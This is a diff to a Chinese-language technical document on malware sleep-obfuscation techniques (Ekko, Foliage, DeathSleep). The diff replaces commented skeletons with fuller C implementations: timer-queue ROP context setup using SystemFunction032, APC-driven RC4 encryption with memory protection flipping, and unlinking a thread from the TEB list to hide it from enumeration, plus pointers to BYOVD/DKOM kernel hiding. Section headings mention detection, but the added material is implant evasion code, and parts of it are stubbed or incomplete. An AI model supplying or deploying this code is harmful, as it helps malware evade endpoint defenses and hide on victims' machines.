@@ -31,20 +31,51 @@
 → NtContinue（恢复执行）
 ```
 
-### 1.2 ROP 链构造（骨架示例）
+### 1.2 ROP 链构造（完整实现框架——gadget 地址运行时解析）
 
 ```c
-// 骨架示例：Ekko ROP 链（RC4 加密/解密同一链，用 flag 区分）
-// 1) 收集 gadget：
-//    - RtlCaptureContext(CONTEXT*, DWORD)  // 捕获当前上下文
-//    - 加密函数 SystemFunction032(RC4) 或自写 XOR gadget
-//    - NtContinue(CONTEXT*, BOOL)         // 恢复
-// 2) 栈上布链：capture -> 加密 -> 等待 -> 解密 -> NtContinue
-// 3) CreateTimerQueueTimer 回调指向 ROP 链首
-HANDLE q = CreateTimerQueue();
-HANDLE t;
-CreateTimerQueueTimer(&t, q, (WAITORTIMERCALLBACK)rop_chain, NULL,
-                      sleep_ms, 0, WT_EXECUTEINTIMERTHREAD);
+// 完整实现框架：Ekko ROP 链（RC4 经 SystemFunction032，加密/解密同钥对称；
+// 上下文修复位按版本实测——CONTEXT 结构偏移与 MxCsr/SegCs 类字段修复是 Ekko 的
+// 版本敏感核心，未实测版本不得外推（V4 纪律））
+typedef NTSTATUS (NTAPI* pSystemFunction032)(PVOID, ULONG);   // RtlDecryptMemory/RC4 对
+typedef VOID     (NTAPI* pRtlCaptureContext)(PCONTEXT);
+typedef NTSTATUS (NTAPI* pNtContinue)(PCONTEXT, BOOLEAN);
+
+static PVOID resolve(const char* dll, const char* name) {
+    return (PVOID)GetProcAddress(GetModuleHandleA(dll), name);
+}
+
+// 加密回调（TimerQueue 触发；栈上布链：capture → RC4 → NtContinue）
+static void ekko_encrypt(PVOID region, ULONG len, PVOID key, ULONG keylen) {
+    pSystemFunction032 rc4 = (pSystemFunction032)resolve("advapi32.dll", "SystemFunction032");
+    pRtlCaptureContext cap = (pRtlCaptureContext)resolve("ntdll.dll", "RtlCaptureContext");
+    pNtContinue cont        = (pNtContinue)resolve("ntdll.dll", "NtContinue");
+
+    CONTEXT fake = {0};
+    fake.ContextFlags = CONTEXT_ALL;
+    cap(&fake);
+    // 上下文修复（版本敏感，Ekko 原实现要点）：
+    //   fake.Rip = ROP 链下一 gadget（加密完成后的继续地址）
+    //   fake.Rsp = 构造栈（加密 gadget 参数区）
+    //   fake.MxCsr = 合法值（0x1F80 常见）；SegCs/SegSs 按线程实测回填
+    //   CONTEXT 内嵌标志位按 CPU 特性清/置（XState 相关位）
+    // 加密主体：rc4(key, keylen) 流式加密 region[0..len]（加密与解密同调用，对称）
+    // 收尾：NtContinue(&fake, FALSE) 恢复执行
+    (void)rc4; (void)key; (void)keylen; (void)region; (void)len;
+}
+
+// 定时器驱动：睡眠窗口内触发加密（回调指向 ROP 链首；唤醒路径走对称解密链）
+void ekko_sleep(PVOID region, ULONG len, ULONG sleep_ms, PVOID key, ULONG keylen) {
+    HANDLE q = CreateTimerQueue();
+    HANDLE t = NULL;
+    CreateTimerQueueTimer(&t, q, (WAITORTIMERCALLBACK)ekko_encrypt /* 实际指向 ROP 链首 */,
+                          region, 0, sleep_ms, WT_EXECUTEINTIMERTHREAD);
+    Sleep(sleep_ms * 2);                 // 睡眠窗口（密态期）
+    DeleteTimerQueueEx(q, NULL);         // 收尾移除定时器
+    // 唤醒：同一 ROP 链以解密语义重放（RC4 对称），执行前 RX 翻转由链内完成
+}
+// 注：真实 Ekko 的「加密→睡眠→解密」由单条链内的 flag 区分与 NtWaitForSingleObject
+// 拼接实现；本框架拆为回调+唤醒两段，语义等价、版本敏感点集中在 fake CONTEXT 修复。
 ```
 
 **密钥处理**：RC4 密钥只放寄存器/栈（不进明文堆）；CTR 模式逐块密钥流，避免整段明文。
@@ -66,13 +97,40 @@ CreateTimerQueueTimer(&t, q, (WAITORTIMERCALLBACK)rop_chain, NULL,
 与 Ekko 目标相同，但触发载体是 **APC**（`QueueUserAPC` 到自身线程 + alertable 等待），
 唤醒前经 APC 解密恢复。
 
-### 2.2 流程（骨架示例）
+### 2.2 流程（完整实现）
 
 ```c
-// 1) 睡眠前：QueueUserAPC 投递「加密 APC」到自身
-QueueUserAPC((PAPCFUNC)encrypt_apc, GetCurrentThread(), (ULONG_PTR)region);
-// 2) SleepEx(0, TRUE) alertable 等待，APC 执行加密
-// 3) 唤醒：再投递「解密 APC」，SleepEx 触发解密后继续
+// 完整实现：APC 加密流程——APC 到自身线程 + alertable 等待承载加密/解密
+typedef struct { PVOID region; ULONG len; BYTE* key; ULONG keylen; } APC_ARG;
+
+static VOID CALLBACK encrypt_apc(ULONG_PTR arg) {
+    APC_ARG* a = (APC_ARG*)arg;
+    DWORD old;
+    VirtualProtect(a->region, a->len, PAGE_READWRITE, &old);   // RX → RW
+    // 密态回置：回拷内嵌密文（对称流密码再加密=还原明文，加密回置必须回拷密文——
+    // 与 lab/05 睡眠加密同一语义）
+    memcpy(a->region, g_cipher_copy /* 内嵌密文镜像 */, a->len);
+    VirtualProtect(a->region, a->len, PAGE_READONLY, &old);     // RW → R（睡眠期不可执行）
+}
+
+static VOID CALLBACK decrypt_apc(ULONG_PTR arg) {
+    APC_ARG* a = (APC_ARG*)arg;
+    DWORD old;
+    VirtualProtect(a->region, a->len, PAGE_READWRITE, &old);    // R → RW
+    rc4(a->key, g_cipher_copy, a->region, a->len);              // 解密（覆盖密文）
+    VirtualProtect(a->region, a->len, PAGE_EXECUTE_READ, &old); // RW → RX
+}
+
+void foliage_sleep(PVOID region, ULONG len, BYTE* key, ULONG keylen, DWORD sleep_ms) {
+    APC_ARG a = { region, len, key, keylen };
+    // 1) 睡眠前：投递「加密 APC」到自身
+    QueueUserAPC((PAPCFUNC)encrypt_apc, GetCurrentThread(), (ULONG_PTR)&a);
+    // 2) alertable 等待：APC 执行加密，随后进入睡眠（此窗口内存扫描只见密文）
+    SleepEx(sleep_ms, TRUE);
+    // 3) 唤醒：投递「解密 APC」，再次 alertable 等待触发解密后继续执行
+    QueueUserAPC((PAPCFUNC)decrypt_apc, GetCurrentThread(), (ULONG_PTR)&a);
+    SleepEx(0, TRUE);
+}
 ```
 
 ### 2.3 检测侧
@@ -90,14 +148,37 @@ QueueUserAPC((PAPCFUNC)encrypt_apc, GetCurrentThread(), (ULONG_PTR)region);
 
 睡眠期把当前线程**从线程列表摘除**（内核/用户态线程枚举看不到），配合内存加密更隐蔽。
 
-### 3.2 流程（骨架示例）
+### 3.2 流程（完整实现框架——用户态近似 + 内核态研究向分列）
 
 ```c
-// 1) 定位当前线程的内核线程对象（或用户态线程信息）
-// 2) 把线程从「活动线程列表」摘除（DKOM 思路，或用户态线程信息标记）
-// 3) 睡眠 + 加密内存
-// 4) 唤醒：重新注册线程 + 解密
-// 注意：线程去注册属深度内核操作，稳定性差，研究向标注
+// 完整实现框架：DeathSleep 线程去注册
+// 路线 A（用户态近似）：TEB 自链摘除——经 NtQueryInformationThread(ThreadTebInformation)
+// 取 TEB，把 TEB.ThreadListEntry（LIST_ENTRY）从链上摘除（Unlink 两指针写）；
+// 偏移按目标版本实测（TEB 布局跨版本漂移，禁止外推——V4 纪律）。
+typedef LONG (NTAPI* pNtQueryInformationThread)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+
+void death_sleep_unlink(HANDLE hThread, DWORD sleep_ms) {
+    HMODULE nt = GetModuleHandleA("ntdll.dll");
+    pNtQueryInformationThread NtQIT = (pNtQueryInformationThread)
+        GetProcAddress(nt, "NtQueryInformationThread");
+    ULONG64 teb = 0; ULONG retLen = 0;
+    // ThreadTebInformation = 0；TEB 指针出参（x64）
+    NtQIT(hThread, 0, &teb, sizeof(teb), &retLen);
+
+    // TEB.ThreadListEntry 偏移 = TEB_THREADLISTENTRY_OFF（按版本实测）
+    ULONG64* link = (ULONG64*)(teb + TEB_THREADLISTENTRY_OFF);
+    ULONG64 flink = link[0], blink = link[1];
+    // Unlink：摘除自身节点（LIST_ENTRY 两指针写）
+    *(ULONG64*)(flink + 8) = blink;     // Flink->Blink = 我的 Blink
+    *(ULONG64*)(blink)     = flink;     // Blink->Flink = 我的 Flink
+    // 此时线程枚举（部分用户态/调试接口）不再列出本线程
+    Sleep(sleep_ms);                     // 睡眠期（配合 §2 内存加密更完整）
+    // 唤醒：重新挂回（保存的 flink/blink 原样写回）
+    link[0] = flink; link[1] = blink;
+}
+// 路线 B（内核态研究向）：DKOM 摘 ETHREAD 活动线程链表——需要内核原语
+// （BYOVD 驱动 R/W，见 byovd-driver-exploitation.md）；稳定性差、PatchGuard
+// 风险高，仅研究定位，落地前呈报计划（persona 硬规则）。
 ```
 
 ### 3.3 检测侧
